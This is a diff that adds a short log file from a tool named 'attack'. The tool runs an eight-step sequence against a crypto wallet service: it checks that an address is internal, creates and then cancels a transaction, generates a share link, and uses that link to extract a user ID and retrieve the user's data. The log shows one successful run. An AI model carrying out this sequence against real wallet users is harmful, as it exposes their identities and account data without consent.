@@ -1,0 +1,23 @@
+2026-02-19 15:29:34,646 | DEBUG | attack | Starting executeFullTransaction
+2026-02-19 15:29:34,646 | DEBUG | attack | Target address: 0x503fAAf9024ae6B44683552915D75e6cE99dbC5e | Amount: 0.0000011 | Coin: ETH
+2026-02-19 15:29:34,646 | DEBUG | attack | Step 1: Checking internal address
+2026-02-19 15:29:35,445 | WARNING | attack | Address is not internal. Aborting transaction.
+2026-02-19 15:30:45,794 | DEBUG | attack | Starting executeFullTransaction
+2026-02-19 15:30:45,794 | DEBUG | attack | Target address: 0x3e62ddb56D33CcbacAf718656B887daa8c132876 | Amount: 0.0000011 | Coin: ETH
+2026-02-19 15:30:45,794 | DEBUG | attack | Step 1: Checking internal address
+2026-02-19 15:30:46,805 | DEBUG | attack | Address confirmed as internal
+2026-02-19 15:30:46,805 | DEBUG | attack | Step 2: Generating new bill ID
+2026-02-19 15:30:47,668 | DEBUG | attack | Generated billId: 202602191330522024476780826951680
+2026-02-19 15:30:47,668 | DEBUG | attack | Step 3: Making transaction
+2026-02-19 15:30:48,612 | DEBUG | attack | Transaction result: {'bill_id': '202602191330522024476780826951680', 'type': 3}
+2026-02-19 15:30:48,612 | DEBUG | attack | Step 4: Fetching transaction ID
+2026-02-19 15:30:49,347 | DEBUG | attack | Transaction ID: 202602191330522024476784284815360
+2026-02-19 15:30:49,347 | DEBUG | attack | Step 5: Creating transaction share link
+2026-02-19 15:30:50,386 | DEBUG | attack | Share link created: https://s.cwallet.com/17yontd
+2026-02-19 15:30:50,386 | DEBUG | attack | Step 6: Canceling transaction
+2026-02-19 15:30:51,430 | DEBUG | attack | Transaction canceled successfully
+2026-02-19 15:30:51,430 | DEBUG | attack | Step 7: Getting user ID from share link
+2026-02-19 15:30:52,171 | DEBUG | attack | Extracted userId: 17999839
+2026-02-19 15:30:52,171 | DEBUG | attack | Step 8: Fetching user data
+2026-02-19 15:30:52,910 | DEBUG | attack | User data retrieved successfully
+2026-02-19 15:30:52,910 | INFO | attack | executeFullTransaction completed successfully
